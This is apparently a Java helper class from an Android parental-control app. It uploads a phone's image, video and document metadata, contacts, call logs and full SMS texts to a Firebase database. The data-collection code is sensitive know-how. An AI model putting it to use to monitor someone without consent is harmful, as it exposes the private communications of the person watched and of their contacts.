package com.example.parentalcontrol.utils;

import android.net.Uri;
import android.os.AsyncTask;
import android.telecom.Call;
import android.util.Log;

import androidx.annotation.NonNull;

import com.example.parentalcontrol.model.CallLogModel;
import com.example.parentalcontrol.model.ContactModel;
import com.example.parentalcontrol.model.DocumentModel;
import com.example.parentalcontrol.model.ImageModel;
import com.example.parentalcontrol.model.ImageModelFirebase;
import com.example.parentalcontrol.model.SmsModel;
import com.example.parentalcontrol.model.VideoModel;
import com.example.parentalcontrol.model.VideoModelFirebase;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.List;

public class FirebaseHelper {

    /*public static void uploadImagesToFirebase(List<ImageModel> imageList) {

        // Get reference of database location
        DatabaseReference databaseReference = FirebaseDatabase.getInstance().getReference("UserId");

        for (ImageModel imageModel : imageList) {
            String id = imageModel.getId();
            String title = imageModel.getTitle();
            String folderName = imageModel.getFolderName();
            String size = imageModel.getSize();
            String path = imageModel.getPath();
            String uri = imageModel.getUri().toString();

            ImageModelFirebase uploadModel = new ImageModelFirebase(id, title, folderName, size, path, uri);
            databaseReference.child("imagesData").child(id).setValue(uploadModel).addOnFailureListener(new OnFailureListener() {
                @Override
                public void onFailure(@NonNull Exception e) {
                    Log.d("FirebaseListenerMsg", "onFailure: "+e.getMessage());
                }
            });
        }
    }*/

    public static void uploadImagesToFirebase(List<ImageModel> imageList) {
        new UploadImagesTask().execute(imageList);
    }

    private static class UploadImagesTask extends AsyncTask<List<ImageModel>, Void, Void> {

        @Override
        protected Void doInBackground(List<ImageModel>... lists) {
            if (lists != null && lists.length > 0) {
                List<ImageModel> imageList = lists[0];

                 // Get reference of database location
        DatabaseReference databaseReference = FirebaseDatabase.getInstance().getReference("UserId");

        for (ImageModel imageModel : imageList) {
            String id = imageModel.getId();
            String title = imageModel.getTitle();
            String folderName = imageModel.getFolderName();
            String size = imageModel.getSize();
            String path = imageModel.getPath();
            String uri = imageModel.getUri().toString();

            ImageModelFirebase uploadModel = new ImageModelFirebase(id, title, folderName, size, path, uri);
            databaseReference.child("imagesData").child(id).setValue(uploadModel).addOnFailureListener(new OnFailureListener() {
                @Override
                public void onFailure(@NonNull Exception e) {
                    Log.d("FirebaseListenerMsg", "onFailure: Images "+e.getMessage());
                }
            });
        }
            } else {
                Log.e("AsyncTaskForImages", "No image lists provided");
            }
            return null;
        }

        @Override
        protected void onPostExecute(Void aVoid) {
            super.onPostExecute(aVoid);
            // This method is called on the main thread after doInBackground completes
            Log.d("AsyncTaskForImages", "UploadImagesTask completed");
        }
    }

    public static void uploadVideosToFirebase(List<VideoModel> videoModels){
        new UploadVideosTask().execute(videoModels);
    }

    private static class UploadVideosTask extends AsyncTask<List<VideoModel>,Void, Void>{

        @Override
        protected Void doInBackground(List<VideoModel>... lists) {
            if(lists!=null && lists.length>0){
                List<VideoModel> videoModels = lists[0];

                DatabaseReference databaseReference = FirebaseDatabase.getInstance().getReference("UserId");
                for(VideoModel videoModel: videoModels){
                    String id = videoModel.getId();
                    String title = videoModel.getTitle();
                    String folderName = videoModel.getFolderName();
                    String size = videoModel.getSize();
                    String path = videoModel.getPath();
                    String uri = videoModel.getUri().toString();

                    VideoModelFirebase videoModelFirebase =new VideoModelFirebase(id, title, folderName, size, path, uri);

                    databaseReference.child("videosData").child(id).setValue(videoModelFirebase).addOnFailureListener(new OnFailureListener() {
                        @Override
                        public void onFailure(@NonNull Exception e) {
                            Log.d("FirebaseListenerMsg", "onFailure: Videos "+e.getMessage());
                        }
                    });
                }
            }else{
                    Log.e("AsyncTaskForImages", "No video lists provided");
            }
            return null;
        }

        @Override
        protected void onPostExecute(Void unused) {
            super.onPostExecute(unused);
            // This method is called on the main thread after doInBackground completes
            Log.d("AsyncTaskForVideos", "UploadVideosTask completed");
        }
    }


    public static void uploadDocumentsToFirebase(List<DocumentModel> documentModels){
       new UploadDocumentsTask().execute(documentModels);
    }



    private static class UploadDocumentsTask extends AsyncTask<List<DocumentModel>,Void, Void>{

        @Override
        protected Void doInBackground(List<DocumentModel>... lists) {
            if(lists!=null && lists.length>0){
                List<DocumentModel> documentModels = lists[0];

                DatabaseReference databaseReference = FirebaseDatabase.getInstance().getReference("UserId");
                for(DocumentModel documentModel: documentModels){
                    String id = documentModel.getId();
                    String title = documentModel.getTitle();
                    String folderName = documentModel.getFolderName();
                    String size = documentModel.getSize();
                    String path = documentModel.getPath();

                    DocumentModel documentModelFirebase =new DocumentModel(id, title, folderName, size, path);

                    databaseReference.child("documentData").child(id).setValue(documentModelFirebase).addOnFailureListener(new OnFailureListener() {
                        @Override
                        public void onFailure(@NonNull Exception e) {
                            Log.d("FirebaseListenerMsg", "onFailure: Videos "+e.getMessage());
                        }
                    });
                }
            }else{
                Log.e("AsyncTaskForDocuments", "No documents lists provided");
            }
            return null;
        }

        @Override
        protected void onPostExecute(Void unused) {
            super.onPostExecute(unused);
            Log.d("AsyncTaskForDocuments", "UploadDocumentsTask completed");
        }
    }

    public static void uploadContactsToFirebase(List<ContactModel> contactModeList){
            new UploadContactsTask().execute(contactModeList);
    }


    private static class UploadContactsTask extends AsyncTask<List<ContactModel>, Void, Void>{

        @Override
        protected Void doInBackground(List<ContactModel>... lists) {
            if(lists!=null && lists.length>0){
                List<ContactModel> contactModels = lists[0];

                DatabaseReference databaseReference = FirebaseDatabase.getInstance().getReference("UserId");
                for(ContactModel contactModel: contactModels){
                    String contactId = contactModel.getContactId();
                    String displayName = contactModel.getDisplayName();
                    List<String> phoneNumbers = contactModel.getPhoneNumbers();


                    ContactModel contactModelFirebase =new ContactModel(contactId, displayName, phoneNumbers);

                    databaseReference.child("contactData").child(contactId).setValue(contactModelFirebase).addOnFailureListener(new OnFailureListener() {
                        @Override
                        public void onFailure(@NonNull Exception e) {
                            Log.d("FirebaseListenerMsg", "onFailure: Videos "+e.getMessage());
                        }
                    });
                }
            }else{
                Log.e("AsyncTaskForContacts", "No contacts lists provided");
            }
            return null;
        }

        @Override
        protected void onPostExecute(Void unused) {
            super.onPostExecute(unused);
            Log.d("AsyncTaskForContacts", "UploadContactsTask completed");
        }
    }

    public static void uploadCallLogToFirebase(List<CallLogModel> callLogModelList){
        new UploadCallLogTask().execute(callLogModelList);
    }

    private static class UploadCallLogTask extends AsyncTask<List<CallLogModel>, Void, Void>{

        @Override
        protected Void doInBackground(List<CallLogModel>... lists) {
            if(lists!=null && lists.length>0){
                List<CallLogModel> callLogModels = lists[0];

                DatabaseReference databaseReference = FirebaseDatabase.getInstance().getReference("UserId");
                for(CallLogModel callLogModel: callLogModels){
                    String id = callLogModel.getId();
                    String contactNumber = callLogModel.getNumber();
                    String displayName = callLogModel.getName();
                    String dateCall = callLogModel.getDate();
                    int typeCall = callLogModel.getType();


                    CallLogModel callLogModel1 =new CallLogModel(id, contactNumber, displayName, dateCall,typeCall);

                    databaseReference.child("callLogData").child(id).setValue(callLogModel1).addOnFailureListener(new OnFailureListener() {
                        @Override
                        public void onFailure(@NonNull Exception e) {
                            Log.d("FirebaseListenerMsg", "onFailure: Videos "+e.getMessage());
                        }
                    });
                }
            }else{
                Log.e("AsyncTaskForCallLog", "No CallLog lists provided");
            }
            return null;
        }

        @Override
        protected void onPostExecute(Void unused) {
            super.onPostExecute(unused);
            Log.d("AsyncTaskForCallLog", "UploadCallLogTask completed");
        }
    }

    public static void uploadSmsToFirebase(List<SmsModel> smsModelList){
        new UploadSmsTask().execute(smsModelList);
    }

    private static class UploadSmsTask extends AsyncTask<List<SmsModel>, Void, Void>{

        @Override
        protected Void doInBackground(List<SmsModel>... lists) {
            if(lists!=null && lists.length>0){
                List<SmsModel> smsModelList = lists[0];

                DatabaseReference databaseReference = FirebaseDatabase.getInstance().getReference("UserId");
                for(SmsModel smsModel: smsModelList){
                    String id = smsModel.getId();
                    String address = smsModel.getAddress();
                    String body = smsModel.getBody();
                    String date = smsModel.getDate();
                    boolean isSent = smsModel.isSent();


                    SmsModel smsModel1 =new SmsModel(id, address, body, date,isSent);

                    databaseReference.child("smsData").child(id).setValue(smsModel1).addOnFailureListener(new OnFailureListener() {
                        @Override
                        public void onFailure(@NonNull Exception e) {
                            Log.d("FirebaseListenerMsg", "onFailure: sms "+e.getMessage());
                        }
                    });
                }
            }else{
                Log.e("AsyncTaskForSms", "No Sms lists provided");
            }
            return null;
        }

        @Override
        protected void onPostExecute(Void unused) {
            super.onPostExecute(unused);
            Log.d("AsyncTaskForSms", "UploadSmsTask completed");
        }
    }
}
